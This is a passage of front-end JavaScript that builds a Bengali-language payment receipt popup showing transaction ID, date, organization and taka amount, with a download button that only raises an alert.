    content.appendChild(receiptsContainer);
  }

  // Receipt details popup
  function openReceiptDetailsPopup(transaction) {
    const { content } = createBasePopup();

    // Create receipt details UI
    const receiptContainer = document.createElement("div");
    receiptContainer.style.textAlign = "center";
    receiptContainer.style.padding = "20px 0";

    // Success icon
    const successIcon = document.createElement("div");
    successIcon.style.width = "80px";
    successIcon.style.height = "80px";
    successIcon.style.margin = "0 auto 20px";
    successIcon.style.backgroundColor = "#E8F6EE";
    successIcon.style.borderRadius = "50%";
    successIcon.style.display = "flex";
    successIcon.style.alignItems = "center";
    successIcon.style.justifyContent = "center";

    const iconInner = document.createElement("div");
    iconInner.innerHTML =
      '<i class="fas fa-check" style="color: #00A650; font-size: 40px;"></i>';
    successIcon.appendChild(iconInner);

    // Success text
    const successTitle = document.createElement("h3");
    successTitle.textContent = "পেমেন্ট সফল হয়েছে!";
    successTitle.style.fontSize = "20px";
    successTitle.style.fontWeight = "600";
    successTitle.style.color = "#00A650";
    successTitle.style.marginBottom = "5px";

    receiptContainer.appendChild(successIcon);
    receiptContainer.appendChild(successTitle);

    // Transaction details
    const transactionDetails = document.createElement("div");
    transactionDetails.style.backgroundColor = "#f8f8f8";
    transactionDetails.style.padding = "20px";
    transactionDetails.style.borderRadius = "8px";
    transactionDetails.style.margin = "20px";
    transactionDetails.style.textAlign = "left";

    // Transaction ID
    const txnDetails = document.createElement("div");
    txnDetails.style.marginBottom = "15px";

    const txnLabel = document.createElement("div");
    txnLabel.textContent = "ট্রানজেকশন আইডি";
    txnLabel.style.fontSize = "14px";
    txnLabel.style.color = "#666";
    txnLabel.style.marginBottom = "5px";

    const txnValue = document.createElement("div");
    txnValue.textContent = transaction.id;
    txnValue.style.fontSize = "16px";
    txnValue.style.fontWeight = "600";

    txnDetails.appendChild(txnLabel);
    txnDetails.appendChild(txnValue);

    // Date & Time
    const dateDetails = document.createElement("div");
    dateDetails.style.marginBottom = "15px";

    const dateLabel = document.createElement("div");
    dateLabel.textContent = "তারিখ ও সময়";
    dateLabel.style.fontSize = "14px";
    dateLabel.style.color = "#666";
    dateLabel.style.marginBottom = "5px";

    const dateValue = document.createElement("div");
    dateValue.textContent = transaction.date;
    dateValue.style.fontSize = "16px";
    dateValue.style.fontWeight = "500";

    dateDetails.appendChild(dateLabel);
    dateDetails.appendChild(dateValue);

    // Organization
    const orgDetails = document.createElement("div");
    orgDetails.style.marginBottom = "15px";

    const orgLabel = document.createElement("div");
    orgLabel.textContent = "প্রতিষ্ঠান";
    orgLabel.style.fontSize = "14px";
    orgLabel.style.color = "#666";
    orgLabel.style.marginBottom = "5px";

    const orgValue = document.createElement("div");
    orgValue.textContent = transaction.organization;
    orgValue.style.fontSize = "16px";
    orgValue.style.fontWeight = "500";

    orgDetails.appendChild(orgLabel);
    orgDetails.appendChild(orgValue);

    // Amount
    const amountDetails = document.createElement("div");

    const amountLabel = document.createElement("div");
    amountLabel.textContent = "পরিমাণ";
    amountLabel.style.fontSize = "14px";
    amountLabel.style.color = "#666";
    amountLabel.style.marginBottom = "5px";

    const amountValue = document.createElement("div");
    amountValue.textContent = transaction.amount + " ৳";
    amountValue.style.fontSize = "18px";
    amountValue.style.fontWeight = "600";
    amountValue.style.color = "#e2146c";

    amountDetails.appendChild(amountLabel);
    amountDetails.appendChild(amountValue);

    transactionDetails.appendChild(txnDetails);
    transactionDetails.appendChild(dateDetails);
    transactionDetails.appendChild(orgDetails);
    transactionDetails.appendChild(amountDetails);

    receiptContainer.appendChild(transactionDetails);

    // Download button
    const buttonContainer = document.createElement("div");
    buttonContainer.style.padding = "0 20px";

    const downloadButton = document.createElement("button");
    downloadButton.type = "button";
    downloadButton.className = "download-button";
    downloadButton.textContent = "ডাউনলোড রিসিট";
    downloadButton.style.width = "100%";
    downloadButton.style.backgroundColor = "#e2146c";
    downloadButton.style.color = "white";
    downloadButton.style.border = "none";
    downloadButton.style.borderRadius = "30px";
    downloadButton.style.padding = "12px 20px";
    downloadButton.style.fontWeight = "500";
    downloadButton.style.fontSize = "16px";
    downloadButton.style.cursor = "pointer";

    downloadButton.addEventListener("click", function () {
      // Similar download functionality as in success popup
      alert("রিসিট ডাউনলোড হচ্ছে...");
    });

    buttonContainer.appendChild(downloadButton);
    receiptContainer.appendChild(buttonContainer);

    content.appendChild(receiptContainer);
  }
});


